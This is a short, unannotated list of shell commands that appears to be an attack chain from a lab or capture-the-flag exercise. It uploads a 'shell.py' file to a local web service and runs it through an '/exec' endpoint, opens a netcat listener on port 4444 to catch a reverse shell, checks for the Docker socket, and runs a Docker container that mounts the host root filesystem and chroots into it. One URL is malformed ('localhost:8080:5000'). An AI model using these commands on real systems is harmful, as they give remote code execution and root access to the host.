

curl -X POST http://localhost:5000/exec \
     -H "Content-Type: application/json" \
     -d '{"cmd": "python3 /uploads/shell.py"}'


curl -X POST http://localhost:8080/upload -F "file=@shell.py"
curl -X POST http://localhost:8080:5000/exec -H "Content-Type: application/json" -d '{"cmd": "python3 /uploads/shell.py"}'
nc -lvnp 4444
ls -l /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
